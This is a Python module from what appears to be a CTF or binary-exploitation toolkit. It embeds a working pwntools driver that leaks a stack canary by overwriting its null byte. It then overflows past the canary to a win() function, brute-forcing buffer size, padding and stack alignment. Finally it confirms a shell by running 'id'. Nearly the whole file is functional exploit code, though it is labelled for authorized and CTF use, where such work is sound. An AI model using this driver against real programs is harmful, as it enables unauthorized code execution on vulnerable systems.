"""Stack-canary bypass via leak, verified by execution.

A stack canary stops a linear overflow (it is checked before `ret`), UNLESS the program also
leaks the canary. The classic primitive: a buffer printed with `%s` right after a read that can
overwrite the canary's null least-significant byte -- overwriting that 0x00 makes `%s` keep going
and print the upper 7 canary bytes. We recover `canary = 0x00 | leaked7`, then a second overflow
rewrites the SAME canary value in place and continues past it to `win()`. For AUTHORIZED / CTF.
Runs in the shared sandbox (Docker image or native fallback)."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys
from subprocess import STDOUT
from pwn import *
elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
context.timeout = 3
win = (elf.symbols or {}).get("win")
if not win:
    print("NO_WIN"); sys.exit(1)
try:
    ret = ROP(elf).find_gadget(["ret"]).address      # for stack alignment before win()->system()
except Exception:
    ret = None
MARK = b"BINORACLE_PWNED"

# buf-to-canary distance (buffer size); the canary sits right after the buffer. For each, try the
# saved-rbp gap (usually 8) and whether a `ret` alignment slot before win() is needed (system()'s
# movaps requires a 16-aligned stack). A leak that overwrites the canary's null LSB is what lets
# the %s print the upper 7 canary bytes; if the read is too short to reach the LSB, no leak.
for bufsz in (72, 64, 56, 88, 40, 48, 80, 96, 104, 112, 120, 128, 32):
    for rbpgap in (8, 0, 16):
        for align in ((ret,) if ret else (None,)) + ((None,) if ret else ()):
            io = None
            try:
                io = process([elf.path], aslr=False, stderr=STDOUT)
                # Stage 1 -- leak: overwrite ONLY the canary's null LSB with a non-zero byte so the
                # following %s keeps going into the upper 7 canary bytes.
                io.send(b"A" * bufsz + b"B")
                try:
                    io.recvuntil(b"B", timeout=2)            # up to the LSB byte we planted
                    leaked = io.recv(7, timeout=2)           # the 7 upper canary bytes
                except Exception:
                    leaked = b""
                if len(leaked) < 7:
                    io.close(); continue
                canary = u64(b"\x00" + leaked)               # glibc canary LSB is always 0x00
                if canary == 0 or (canary & 0xff) != 0:
                    io.close(); continue
                try:
                    io.recvrepeat(0.3)                       # drain to the next (overflow) read
                except Exception:
                    pass
                # Stage 2 -- rewrite the SAME canary (check passes), saved rbp padding, optional
                # ret for alignment, then the return address = win().
                tail = (p64(align) if align else b"") + p64(win)
                io.send(b"A" * bufsz + p64(canary) + b"A" * rbpgap + tail)
                dbg = b""
                try:
                    dbg += io.recvrepeat(1.0)
                except Exception:
                    pass
                io.sendline(b"echo " + MARK + b"; id")
                try:
                    dbg += io.recvrepeat(1.5)
                except Exception:
                    pass
                io.close()
                if MARK in dbg or b"uid=" in dbg or b"win" in dbg:
                    print("VERIFIED bufsz=%d rbpgap=%d align=%s canary=%#x win=%#x"
                          % (bufsz, rbpgap, "ret" if align else "none", canary, win))
                    sys.exit(0)
            except Exception:
                try:
                    if io: io.close()
                except Exception:
                    pass
print("NOT_VERIFIED")
sys.exit(1)
'''


def autocanary(binary: str) -> dict:
    """Leak the stack canary and overflow past it to win(), verified by execution. Needs a `win`
    gift and a leak primitive (a `%s`/echo of the overflowable buffer). Docker image or native
    sandbox; degrades cleanly otherwise."""
    res = run_driver(binary, _DRIVER, ".binoracle_canary.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"canary leak -> overflow -> win (verificado por ejecucion, {eng})"
                   if res.get("verified")
                   else f"no verificado ({eng}): sin fuga del canary utilizable o sin win")
    return res


def render_canary(r: dict) -> str:
    out = ["## Bypass de stack canary (fuga + overflow, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    return "\n".join(out)
